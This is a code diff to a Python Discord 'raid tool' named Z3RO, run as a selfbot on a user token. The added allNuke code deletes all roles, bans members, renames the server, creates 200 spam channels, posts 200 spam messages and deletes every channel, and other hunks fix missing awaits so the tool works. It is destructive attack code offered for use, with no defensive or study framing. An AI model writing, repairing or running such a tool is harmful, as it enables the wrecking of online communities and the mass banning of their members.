@@ -90,7 +90,7 @@ async def mscd(ctx):
         
     except:
         await ctx.message.delete()
-        message = ctx.send("**Z3RO RAID TOOL", description="Destroying all channels in 3 seconds...")
+        message = await ctx.send("**Z3RO RAID TOOL", description="Destroying all channels in 3 seconds...")
         await message.add_reaction("✅")
         await asyncio.sleep(3)
         await message.delete()
@@ -100,7 +100,7 @@ async def mscd(ctx):
 
 
 @raidtool.command()
-async def allNuke(ctx, serverTitle : str):
+async def allNuke(ctx, serverTitle : str=None):
     if serverTitle == None:
         try:
             await ctx.message.delete()
@@ -113,7 +113,7 @@ async def allNuke(ctx, serverTitle : str):
             
         except:
             await ctx.message.delete()
-            message = ctx.send(f"**Z3RO RAID TOOL** \n**Server Title returned : null** \n**Reason:** \n**You must give a server title**")
+            message = await ctx.send(f"**Z3RO RAID TOOL** \n**Server Title returned : null** \n**Reason:** \n**You must give a server title**")
             await message.add_reaction("✅")
             await asyncio.sleep(3)
             await message.delete()
@@ -122,6 +122,65 @@ async def allNuke(ctx, serverTitle : str):
             await ctx.message.delete()
             embed = discord.Embed(title="Z3RO RAID TOOL", description="Nuking server in 3 seconds... Sorry to this server by the way... ¯\_(ツ)_/¯")
             message = await ctx.send(embed=embed)
+            await asyncio.sleep(3)
+            await message.delete()
+            
+            try:
+                for x in list(ctx.guild.roles):
+                    try:
+                        await x.delete()
+                        print("Role {} successfully deleted.".format(x.id))
+                    except:
+                        print("Role {} could not be deleted.".format(x.id))
+            except:
+                return None
+            try:
+                for _ in list(ctx.guild.users):
+                    try:
+                        await _.ban()
+                        print("User {0} : {1} successfully banned.".format(_.id, _.display_name))
+                    except:
+                        print("User {0} : {1} could not be banned.".format(_.id, _.display_name))
+            except:
+                print("User {0} : {1} could not be banned.".format(_.id, _.display_name))
+
+            try:
+                await ctx.guild.edit(name=serverTitle)
+                
+            except:
+                return None
+            try:
+                for i in range(int(200)):
+                    try:
+                        
+                        await ctx.guild.create_text_channel("get nuked!!1!1!")
+                    except:
+                        return None
+                for i in range(int(200)):
+                    try:
+                        await ctx.send("GET NUKED OMEGALUL !11!111!!!1")
+                    except:
+                        return None
+                    
+                    
+            except:
+                return None
+            
+            try:
+                for y in list(ctx.guild.channels):
+                    try:
+                        await y.delete()
+                        print("Channel {} successfully deleted".format(y.id))
+                    except:
+                        print("Channel {} could not be deleted.".format(y.id))
+            except:
+                return None
+                
+            
+        except:
+            await ctx.message.delete()
+            message = await ctx.send("**Z3RO RAID TOOL** \n**Nuking server in 3 seconds...  Sorry to this server by the way... ¯\_(ツ)_/¯** ")
+            await message.add_reaction("✅")
             await asyncio.sleep(3)
             await message.delete()
             
@@ -171,11 +230,7 @@ async def allNuke(ctx, serverTitle : str):
                         await ctx.send("GET NUKED OMEGALUL !11!111!!!1")
                     except:
                         return None
-                    
-                    
-            except Exception as e:
-                return None
-                    
+            except:
+                return False
             
-raidtool.run(configDict['token'], bot=False)    
-    
+raidtool.run(configDict['token'], bot=False)
